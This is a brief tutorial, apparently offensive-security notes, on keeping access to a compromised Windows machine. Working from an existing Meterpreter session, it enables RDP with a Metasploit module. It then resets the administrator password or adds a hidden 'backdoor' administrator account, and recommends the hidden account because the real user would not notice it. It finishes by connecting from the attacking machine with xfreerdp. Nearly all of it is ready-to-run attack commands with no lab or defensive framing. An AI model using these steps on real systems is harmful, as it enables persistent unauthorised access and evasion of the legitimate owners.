## 🖥️ Enabling RDP for Remote Desktop Access

By default, Windows keeps port **3389** closed. If you have an active Meterpreter session with **SYSTEM** or **Admin** privileges, you can force it open.

### 1. Enable RDP via Metasploit

Run these commands from the `msfconsole`:

Bash

```
search enable_rdp
use post/windows/manage/enable_rdp
set SESSION <ID>
exploit
```

- **Result:** This modifies the registry to allow connections and opens the port in the Windows Firewall.

### 2. Prepare the Credentials

RDP requires a clear-text password. Since you cannot "see" the administrator's current password easily, you have two choices: **Change the Admin password** or **Create a new user.**

#### Option A: Change existing Admin password (Risky)

DOS

```
shell
net user administrator NewPassword123!
```

- _Warning: The real user will be locked out and notice immediately._

#### Option B: Create a Hidden Admin User (Better)

It is safer to create your own "backdoor" account and add it to the Administrators group.

DOS

```
shell
net user backup_admin Pass123! /add
net localgroup "Remote Desktop Users" backup_admin /add
net localgroup Administrators backup_admin /add
```

---
### 3. Connect from your Linux machine

Once the port is open and the user is ready, use `xfreerdp` (or `rdesktop`) from a new terminal on your attacking machine:

Bash

```
xfreerdp /u:backup_admin /p:Pass123! /v:<TARGET_IP> /dynamic-resolution +clipboard
```

- **/dynamic-resolution:** Adjusts the window size automatically.
    
- **+clipboard:** Allows you to copy/paste text between your machine and the target.
